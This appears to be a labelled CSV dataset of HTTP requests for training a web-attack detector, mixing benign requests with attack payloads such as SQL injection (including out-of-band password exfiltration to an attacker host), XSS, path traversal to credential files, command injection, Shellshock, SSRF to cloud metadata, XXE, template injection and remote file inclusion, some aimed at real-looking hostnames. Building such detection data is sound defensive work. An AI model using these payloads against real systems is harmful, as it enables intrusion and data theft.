method,path,query,headers,body,ua,label
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,curl/7.68.0,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,../../../../etc/passwd,,,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /login,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,expect://id,,,1
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,expect://id,,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,`uname -a`,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/favicon.ico,,,,,0
GET,/,,' or '1'='1,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/favicon.ico,,,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/favicon.ico,,,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/favicon.ico,,,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,`uname -a`,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
POST,/profile,,Host: example.com; Accept: */*,username=user637&password=pass817,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,GET /health,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user678&password=pass929,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,php://input,,,1
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,<body onload=alert(1)>,,,1
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,%0als,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/wp-admin/admin-ajax.php,meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,GET /robots.txt,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/favicon.ico,,,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
POST,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,sqlmap/1.5.2,1
GET,/index.php,option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62",1
GET,/,,GET /search?q=security,,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/favicon.ico,,,,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /search?q=1+1=2,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /search?q=machine+learning,,,0
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,| id,,,1
GET,/,,GET /favicon.ico,,,0
GET,/search,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/index.php,q=<img src=x onerror=alert(1)>,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,GET /images/logo.png,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,http://attacker.com/shell.txt,,,1
POST,/search,,Host: example.com; Accept: */*,input=admin'--,curl/7.68.0,1
POST,/search,q=phone,Host: example.com; Accept: */*,username=user341&password=pass428,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,GET /manifest.json,,,0
GET,/,,expect://id,,,1
POST,/products,id=123,Host: example.com; Accept: */*,username=user136&password=pass85,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=0x27204f52202731273d2731,,,1
POST,/home,,Host: example.com; Accept: */*,username=user512&password=pass528,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /health,,,0
GET,/,,|| ls -la,,,1
GET,/dompdf.php,input_file=php://filter/resource=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: web.poc.vnshop.cloud; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
PUT,/index.php,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/index.php,option=com_kif_nexus&controller=../../../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52",1
GET,/,,{smart_f_shell_exec('id')},,,1
DELETE,/admin,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nmap Scripting Engine,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,%0als,,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,GET /images/logo.png,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=; ls -la,Nmap Scripting Engine,1
GET,/favicon.ico,,,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,expect://id,,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,expect://id,,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/favicon.ico,,,,,0
GET,/,,id=1&id=2,,,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /assets/js/bundle.min.js,,,0
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /health,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,%0als,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,|| ls -la,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
POST,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,php://input,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /docs/api/introduction,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user646&password=pass268,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/favicon.ico,,,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /,,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/favicon.ico,,,,,0
